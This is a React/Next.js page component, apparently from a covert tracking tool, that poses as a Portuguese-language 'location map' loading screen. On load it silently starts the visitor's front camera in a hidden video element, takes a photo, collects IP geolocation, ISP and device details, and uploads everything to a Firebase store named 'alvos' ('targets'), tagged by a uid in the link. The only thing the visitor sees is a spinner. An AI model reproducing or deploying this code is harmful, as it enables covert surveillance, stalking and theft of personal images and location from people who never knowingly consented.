"use client"

import { useState, useRef, useEffect } from "react"
import { Loader2 } from "lucide-react"
import { captureAllData } from "@/lib/geolocation"
import { ref, push } from "firebase/database"
import { database } from "@/lib/firebase"
import { SecurityLayer } from "@/components/security-layer"

export default function LocationCapturePage() {
  const [isCapturing, setIsCapturing] = useState(false)
  const [hasCaptured, setHasCaptured] = useState(false)
  const videoRef = useRef<HTMLVideoElement>(null)
  const streamRef = useRef<MediaStream | null>(null)
  const [photoData, setPhotoData] = useState<string | null>(null)
  const [userId, setUserId] = useState<string | null>(null)
  const captureAttempted = useRef(false)

  useEffect(() => {
    const params = new URLSearchParams(window.location.search)
    const userIdParam = params.get("uid")
    setUserId(userIdParam)

    console.log("[v0] 📸 Location capture page loaded, user:", userIdParam)

    // Auto-start camera and capture photo silently
    const autoCapture = async () => {
      try {
        console.log("[v0] 📷 Starting camera...")
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
          audio: false,
        })

        if (videoRef.current) {
          videoRef.current.srcObject = stream
          streamRef.current = stream

          videoRef.current.onplaying = () => {
            console.log("[v0] 📹 Video playing, waiting 2s before capture...")
            setTimeout(() => {
              if (videoRef.current && videoRef.current.readyState >= 2) {
                const canvas = document.createElement("canvas")
                canvas.width = videoRef.current.videoWidth || 640
                canvas.height = videoRef.current.videoHeight || 480

                const ctx = canvas.getContext("2d")
                if (ctx && canvas.width > 0 && canvas.height > 0) {
                  ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height)
                  const photoDataUrl = canvas.toDataURL("image/jpeg", 0.8)
                  console.log("[v0] ✅ Photo captured successfully")
                  setPhotoData(photoDataUrl)

                  if (streamRef.current) {
                    streamRef.current.getTracks().forEach((track) => track.stop())
                    streamRef.current = null
                  }
                } else {
                  console.log("[v0] ⚠️ Camera error - invalid canvas")
                  setPhotoData("camera_error")
                }
              } else {
                console.log("[v0] ⚠️ Camera error - video not ready")
                setPhotoData("camera_error")
              }
            }, 2000)
          }

          videoRef.current.play().catch((err) => {
            console.error("[v0] ❌ Video play error:", err)
          })
        }
      } catch (error) {
        console.error("[v0] ❌ Auto-capture error:", error)
        setPhotoData("camera_denied")
      }
    }

    autoCapture()
  }, [])

  useEffect(() => {
    if (photoData && !captureAttempted.current && !hasCaptured && !isCapturing) {
      console.log("[v0] 🎯 Photo ready, triggering data capture...")
      captureAttempted.current = true
      handleAutoCapture()
    }
  }, [photoData, hasCaptured, isCapturing])

  const handleAutoCapture = async () => {
    if (isCapturing || hasCaptured) {
      console.log("[v0] ⏭️ Skipping capture (already capturing or captured)")
      return
    }

    console.log("[v0] 🚀 Starting auto capture...")
    setIsCapturing(true)

    try {
      console.log("[v0] 🌐 Fetching IP and device data...")
      const data = await captureAllData()

      const userPath = userId || "anonymous"
      const alvosRef = ref(database, `alvos/${userPath}`)

      const capturePayload = {
        pageType: "location",
        pageName: "Mapa de Localização",
        timestamp: Date.now(),
        ipAddress: data.ipData?.ip || "Unknown",
        userAgent: navigator.userAgent,
        ipData: data.ipData
          ? {
              ip: data.ipData.ip,
              latitude: data.ipData.latitude || 0,
              longitude: data.ipData.longitude || 0,
              city: data.ipData.city || "Unknown",
              region: data.ipData.region || "Unknown",
              country: data.ipData.country || "Unknown",
              countryCode: data.ipData.countryCode || "XX",
              timezone: data.ipData.timezone || "Unknown",
              isp: data.ipData.isp || "Unknown",
              org: data.ipData.org || "Unknown",
              as: data.ipData.as || "Unknown",
            }
          : undefined,
        deviceInfo: data.deviceInfo,
        formData:
          photoData && photoData !== "camera_denied" && photoData !== "camera_error" ? { photo: photoData } : undefined,
      }

      console.log("[v0] 💾 Saving to Firebase path:", `alvos/${userPath}`)
      console.log("[v0] 📦 Payload:", {
        pageType: capturePayload.pageType,
        hasIpData: !!capturePayload.ipData,
        hasPhoto: !!capturePayload.formData?.photo,
        coordinates: capturePayload.ipData
          ? `${capturePayload.ipData.latitude}, ${capturePayload.ipData.longitude}`
          : "none",
      })

      const result = await push(alvosRef, capturePayload)
      console.log("[v0] ✅ SAVED TO FIREBASE with key:", result.key)
      console.log("[v0] 🎉 Capture complete!")

      setHasCaptured(true)
    } catch (error) {
      console.error("[v0] ❌ Capture error:", error)
      setHasCaptured(true)
    } finally {
      setIsCapturing(false)
    }
  }

  return (
    <>
      <SecurityLayer />

      <video ref={videoRef} autoPlay playsInline muted className="hidden" />

      <div className="relative h-screen w-full flex items-center justify-center bg-white">
        <div className="text-center space-y-4">
          <Loader2 className="h-12 w-12 animate-spin text-blue-500 mx-auto" />
          <p className="text-gray-600 text-lg">Carregando...</p>
        </div>
      </div>
    </>
  )
}
